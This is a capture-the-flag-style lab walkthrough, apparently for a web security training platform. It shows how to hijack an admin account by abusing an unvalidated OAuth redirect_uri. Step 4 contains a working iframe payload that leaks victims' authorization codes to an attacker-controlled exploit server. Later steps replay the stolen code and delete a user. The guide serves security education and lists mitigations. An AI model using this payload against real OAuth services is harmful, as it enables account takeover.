# Exploiting OAuth Account Hijacking via Redirect URI

This guide delivers a clear, creative, and organized walkthrough to exploit an **OAuth account hijacking** vulnerability through manipulation of the `redirect_uri` parameter. Imagine yourself as a digital puppeteer, pulling strings on the OAuth flow to seize control of an admin account! The objective is to intercept an authorization code, craft a malicious iframe to steal the victim’s code, use it to log in as admin, and delete the user `carlos` to solve the lab.

## Objective

Hijack the admin account by stealing the victim’s OAuth authorization code via a manipulated `redirect_uri`, log in as admin, and delete `carlos`.

## Prerequisites

- Burp Suite with Proxy and Repeater modules configured.
- Access to the lab application with OAuth login functionality and an exploit server.
- Basic understanding of OAuth 2.0 flows, redirects, and iframes.
- Your lab OAuth server ID (e.g., `YOUR-LAB-OAUTH-SERVER-ID`) and client ID.

## Background on the Vulnerability

The OAuth server allows arbitrary `redirect_uri` values without validation, enabling attackers to redirect authorization codes to malicious endpoints. By tricking the victim into authorizing via an iframe on the exploit server, the code is leaked in the access log. This code can then be used to complete the OAuth flow for the admin account, leading to hijacking and unauthorized actions like user deletion.

## Steps to Solve the Lab

### Step 1: Complete the OAuth Login Process

1. In Burp’s browser, click "My account" and complete the OAuth login process.
2. Log out and log back in using the classic form.
3. **Observation**: On subsequent logins, you are instantly authenticated if the OAuth session is active.

### Step 2: Study the OAuth Flow

1. In Burp, go to **Proxy > HTTP history** and locate the most recent `GET /auth?client_id=[...]`.
2. **Observation**: This authorization request includes `redirect_uri` and, upon approval, redirects with the code in the query string (e.g., `/oauth-callback?code=CODE`).

### Step 3: Test Redirect URI Manipulation

1. Send the `GET /auth?client_id=[...]` request to Burp Repeater.
2. Modify the `redirect_uri` to an arbitrary value (e.g., `https://example.com`).
3. Send the request.
4. **Observation**: The server accepts the arbitrary `redirect_uri` and generates a redirect in the response, confirming lack of validation.

### Step 4: Create Malicious Iframe on Exploit Server

1. Log out of the blog website.
2. On the exploit server, create and store an exploit at `/exploit` with an iframe:
   ```html
   <iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
   ```
   (Replace placeholders with your lab-specific values.)
3. Click "View exploit" to test.
4. Check the exploit server’s access log.
5. **Observation**: The log shows a `GET /?code=CODE` request, leaking the code.

### Step 5: Deliver the Exploit to the Victim

1. On the exploit server, click "Deliver to victim".
2. **Observation**: The victim’s browser loads the iframe, successfully authorizing and leaking their code to your access log.

### Step 6: Use the Stolen Code to Log In as Admin

1. Copy the victim’s code from the access log (e.g., `STOLEN-CODE`).
2. Navigate to:
   ```
   https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE
   ```
3. **Observation**: The OAuth flow completes, logging you in as the admin user.

### Step 7: Delete the User `carlos`

1. Navigate to the admin panel and delete `carlos`.
2. **Observation**: The server processes the request, deleting `carlos`, solving the lab.

### Step 8: Verify Success

1. If the lab does not confirm completion, verify:
   - The iframe `src` uses the correct `client_id` and `redirect_uri`.
   - The stolen code is valid and used in the callback URL.
   - You can access the admin panel and perform deletions.
2. **Observation**: Successful deletion of `carlos` completes the lab.

## Success!

You’ve orchestrated an OAuth hijack like a puppet master, stealing the victim’s code with a sneaky iframe and claiming the admin throne to erase `carlos`, conquering the lab!

## Key Takeaways

- **Redirect URI Manipulation**: Unvalidated `redirect_uri` allows code leakage to attacker-controlled servers.
- **Impact**: Account hijacking can grant access to sensitive actions like user deletion.
- **Mitigation**: Validate `redirect_uri` against a whitelist, use state parameters, and secure OAuth endpoints.
- **Testing Tip**: Intercept OAuth requests in Burp Proxy, test arbitrary `redirect_uri` values, and use iframes to simulate victim interactions.